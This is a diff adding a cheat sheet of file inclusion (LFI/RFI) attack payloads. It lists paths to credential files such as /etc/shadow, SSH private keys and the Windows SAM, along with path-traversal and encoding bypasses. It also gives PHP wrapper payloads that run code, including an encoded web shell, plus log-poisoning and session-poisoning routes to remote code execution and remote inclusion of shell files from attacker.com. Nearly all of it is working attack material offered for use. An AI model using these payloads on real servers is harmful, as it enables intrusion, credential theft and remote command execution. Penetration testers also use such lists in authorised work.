@@ -1,0 +1,235 @@
+# File Inclusion (LFI/RFI) Payloads
+
+## ========================================
+## LINUX LFI PAYLOADS
+## ========================================
+
+# Basic LFI
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/issue
+/etc/group
+/proc/self/environ
+/proc/version
+/proc/cmdline
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/self/fd/2
+
+# Apache/Nginx Logs
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+
+# Application Logs
+/var/log/mail
+/var/log/auth.log
+/var/log/syslog
+/var/log/messages
+
+# SSH Keys
+/home/user/.ssh/id_rsa
+/home/user/.ssh/id_dsa
+/home/user/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/authorized_keys
+
+# Application Files
+/var/www/html/index.php
+/var/www/html/config.php
+/.env
+/config/database.yml
+
+## ========================================
+## WINDOWS LFI PAYLOADS
+## ========================================
+
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\config\sam
+C:\Windows\System32\config\system
+C:\Windows\win.ini
+C:\boot.ini
+C:\Windows\debug\NetSetup.log
+C:\Windows\repair\sam
+C:\Windows\repair\system
+C:\inetpub\wwwroot\web.config
+
+## ========================================
+## PATH TRAVERSAL
+## ========================================
+
+../../../etc/passwd
+....//....//....//etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252F..%252F..%252Fetc%252Fpasswd
+..\/..\/..\/etc/passwd
+..\\..\\..\\ windows\\system32\\drivers\\etc\\hosts
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# NULL Byte (PHP < 5.3)
+/etc/passwd%00
+/etc/passwd%00.jpg
+../../../etc/passwd%00
+
+# Double Encoding
+%252e%252e%252f
+%252e%252e%255c
+
+# UTF-8 Encoding
+..%c0%af../..%c0%af../etc/passwd
+
+# Path Truncation (PHP)
+/etc/passwd/././././././.[repeat]
+/etc/passwd..............[add many dots]
+
+# Case Sensitivity Bypass (Windows)
+/etc/PaSsWd
+/EtC/pAsSwD
+
+## ========================================
+## PHP WRAPPERS
+## ========================================
+
+# php://filter - Read Source Code
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+
+# php://input - Code Execution (POST data)
+php://input
+# POST data: <?php system($_GET['cmd']); ?>
+
+# php://data - Code Execution
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+data://text/plain,<?php system($_GET['cmd']); ?>
+
+# expect:// - Command Execution
+expect://id
+expect://whoami
+
+# phar:// - Code Execution via Archive
+phar://archive.phar/shell.php
+
+# zip:// - Extract and Execute
+zip://archive.zip#shell.php
+
+## ========================================
+## LFI TO RCE - Log Poisoning
+## ========================================
+
+# Apache/Nginx Access Log
+# Inject payload in User-Agent, then access log file
+User-Agent: <?php system($_GET['cmd']); ?>
+# Then access: /var/log/apache2/access.log?cmd=whoami
+
+# Mail Log
+# Send email with payload, then access mail log
+mail test@localhost -s "<?php system($_GET['cmd']); ?>"
+# Then access: /var/log/mail?cmd=whoami
+
+# SSH Log
+# SSH with payload as username
+ssh '<?php system($_GET["cmd"]); ?>'@target
+# Then access: /var/log/auth.log?cmd=whoami
+
+## ========================================
+## LFI TO RCE - /proc/self/environ
+## ========================================
+
+# Inject payload in User-Agent or Referer
+User-Agent: <?php system($_GET['cmd']); ?>
+# Then access: /proc/self/environ?cmd=whoami
+
+## ========================================
+## LFI TO RCE - Session Files
+## ========================================
+
+# PHP Session Files
+/tmp/sess_[SESSION_ID]
+/var/lib/php/sessions/sess_[SESSION_ID]
+/var/lib/php5/sess_[SESSION_ID]
+
+# Inject payload in session variable
+$_SESSION['user'] = '<?php system($_GET["cmd"]); ?>';
+
+## ========================================
+## LFI TO RCE - File Upload
+## ========================================
+
+# Upload file with malicious content
+# Then include uploaded file path
+../../../../tmp/uploaded_file.jpg
+
+## ========================================
+## RFI (Remote File Inclusion)
+## ========================================
+
+# Basic RFI
+http://attacker.com/shell.txt
+http://attacker.com/shell.txt?
+https://attacker.com/shell.php
+
+# Bypass Filters
+http://attacker.com/shell.txt%00
+http://attacker.com/shell.txt#
+http://attacker.com/shell.txt%20
+
+# SMB Share (Windows)
+\\attacker.com\share\shell.php
+
+## ========================================
+## FUZZING WORDLIST
+## ========================================
+
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+../../../../../../../
+../../../../../../../../
+
+## ========================================
+## INTERESTING FILES (Linux)
+## ========================================
+
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/mysql/my.cnf
+/etc/httpd/conf/httpd.conf
+/etc/apache2/apache2.conf
+/root/.bash_history
+/root/.ssh/id_rsa
+/var/www/.ssh/id_rsa
+/home/user/.bash_history
+/proc/self/cmdline
+/proc/self/stat
+/proc/self/status
+/proc/self/fd/[0-255]
+
+## ========================================
+## INTERESTING FILES (Windows)
+## ========================================
+
+C:\boot.ini
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\config\sam
+C:\Windows\System32\config\system
+C:\inetpub\logs\LogFiles\W3SVC1\
+C:\inetpub\wwwroot\global.asa
+C:\inetpub\wwwroot\index.asp
+C:\inetpub\wwwroot\web.config
